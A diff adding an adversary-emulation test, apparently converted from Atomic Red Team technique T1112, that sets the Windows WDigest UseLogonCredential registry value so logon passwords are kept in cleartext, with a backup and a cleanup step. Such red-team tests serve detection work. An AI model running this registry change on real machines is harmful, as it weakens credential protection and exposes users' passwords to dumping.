@@ -1,0 +1,48 @@
+# Converted from Atomic Red Team - Modify Registry
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
+# Original auto_generated_guid: c0413fb5-33e2-40b7-9b6f-60b29f4a7a18
+
+---
+api_version: 2.0
+uuid: 3f2d800b-d253-4f9d-9ad9-3b041041fc42
+name: Modify registry to store logon credentials
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
+  Upon execution, the message "The operation completed successfully." will be displayed.
+  Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1112 Modify Registry"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: backup_location
+    description: Path where registry backup will be saved
+    type: path
+    default: "C:\\Users\\Public\\backup.reg"
+
+steps:
+  - name: backup_registry
+    executor: cmd.exe
+    inline: |
+      reg export "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" "{{.Args.backup_location}}" /y
+
+  - name: enable_wdigest_plaintext
+    executor: cmd.exe
+    inline: |
+      reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg import "{{.Args.backup_location}}"
+        del "{{.Args.backup_location}}" /f /q 2>nul
